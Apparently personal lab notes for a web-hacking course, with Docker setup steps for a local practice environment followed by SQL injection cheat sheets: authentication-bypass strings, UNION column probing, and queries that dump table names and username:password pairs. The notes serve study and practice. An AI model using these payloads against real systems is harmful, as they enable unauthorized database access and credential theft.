# SQL Injection

## Lab setup:

`sudo apt update`

`sudo apt upgrade`

`sudo apt install docker.io`

`sudo apt install docker-compose`

**RESTART YOUR VM**

Copy the labs to a directory in your system, then open a terminal to that directory

`tar -xf peh-web-labs.tar.gz`

`cd labs`

`sudo docker-compose up`

(Keep reading! There is one more thing to do after the lab is built!)

The first time it runs, it will need to download some things, it may take a while depending on your connection. Next time you run it though, it will be much faster.

Once you see the databses are 'ready for connections' the containers should be ready to go.

![](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://cdn.filestackcontent.com/rnRf7tsRG2F9tOIVpKEL)

The final step is to set some permissions for the webserver, this is needed for the file upload labs and the capstone challenge.

`./set-permissions.sh`

Browse to `http://localhost`

The first time you load the lab the database will need to be initialized, just follow the instructions in the red box by clicking the link, then coming back to the homepage.

Enjoy your labs!

SQL Injection UNION

```sql
#injection 0x01
1' or 1=1#
1' or 1=1-- -

1' union select null#
1' union select null,null#
1' union select null,null,null#
1' union select null(int),1,null#

#if it show result
1' union select null,null,version()#
1' union select null,null,table_name from information_schema.tables#
1' union select null,null,column_name from information_schema.columns#

1' union select null,null,password from injection0x01#
```

SQL Injection Error Based

```sql
' OR '1' = '1' #
' ORDER BY 7 # (untuk mencari kolom yg dipakai database)
' UNION SELECT 1,2,3,4,5,6,7 #
' UNION SELECT 1,database(),3,4,user(),6,7 #
' UNION SELECT 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema = database() #
' UNION SELECT 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema = database() #
' UNION SELECT 1,2,3,4,5,6,group_concat(username,0x3a,password) from users #
```

